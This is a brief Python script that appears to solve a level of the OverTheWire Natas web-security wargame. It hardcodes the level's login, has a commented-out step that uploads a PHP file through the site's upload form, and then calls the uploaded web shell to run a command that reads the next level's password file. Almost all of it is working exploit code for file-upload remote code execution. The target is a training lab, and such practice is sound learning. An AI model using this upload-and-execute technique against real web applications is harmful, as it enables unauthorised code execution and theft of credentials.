#!/usr/bin/env python

import requests
import re

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % username

# response = requests.get(url, auth=(username, password))
# response = requests.post(url, files = {'uploadedfile' : open('natas12.php', 'rb')}, data = {'filename': 'natas12.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))
session = requests.Session()
response = session.get(url + 'upload/umde6zpk53.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))

content = response.text

print(content)
# print(re.findall('The password for natas9 is (.*)', content))

#  File Upload Remote Code Executio